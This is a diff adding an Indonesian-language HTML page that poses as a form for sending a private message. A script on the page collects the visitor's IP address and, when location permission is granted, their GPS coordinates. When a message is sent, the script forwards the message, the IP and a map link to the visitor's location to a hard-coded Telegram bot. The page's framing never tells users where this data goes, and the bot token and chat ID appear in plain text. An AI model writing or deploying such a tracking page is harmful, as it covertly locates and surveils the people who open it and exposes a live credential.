@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ini judul tab</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1e1e2e;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: #252532;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input {
+            background: #333;
+            color: white;
+        }
+        button {
+            background: #ff5757;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #ff4242;
+        }
+        .info {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Kirim Pesan Secara Pribadi</h2>
+        <input type="text" id="message" placeholder="Masukkan pesan Anda">
+        <button onclick="sendMessage()">Kirim Pesan</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8084602778:AAH1LJvRmTkbWXGCfA4O5gQOxvGBFjkptjA"; // Ganti dengan token bot Telegram
+        const CHAT_ID = "7607840886"; // Ganti dengan ID chat atau grup
+        
+        let userIP = "Tidak Diketahui";
+        let userLocation = "Tidak Diketahui";
+
+        // Ambil IP pengguna
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+                document.getElementById("ip-info").innerText = "IP Anda: " + userIP;
+            })
+            .catch(error => {
+                document.getElementById("ip-info").innerText = "Gagal mendapatkan IP";
+            });
+
+        // Minta izin lokasi pengguna
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    userLocation = `https://www.google.com/maps?q=${lat},${lon}`;
+                    document.getElementById("location-info").innerText = `Lokasi Anda: ${lat}, ${lon}`;
+                },
+                error => {
+                    document.getElementById("location-info").innerText = "Izin lokasi ditolak!";
+                }
+            );
+        } else {
+            document.getElementById("location-info").innerText = "Geolocation tidak didukung!";
+        }
+
+        // Fungsi kirim pesan ke Telegram
+        function sendMessage() {
+            let message = document.getElementById("message").value;
+            if (message.trim() === "") return;
+
+            let text = `📩 *Pesan Baru:*\n\n` +
+                       `💬 Pesan: ${message}\n` +
+                       `🌍 IP: ${userIP}\n` +
+                       `📍 Lokasi: ${userLocation}`;
+
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+            fetch(url).then(response => {
+                document.getElementById("message").value = ""; // Hapus input setelah terkirim
+            });
+        }
+    </script>
+</body>
+</html>
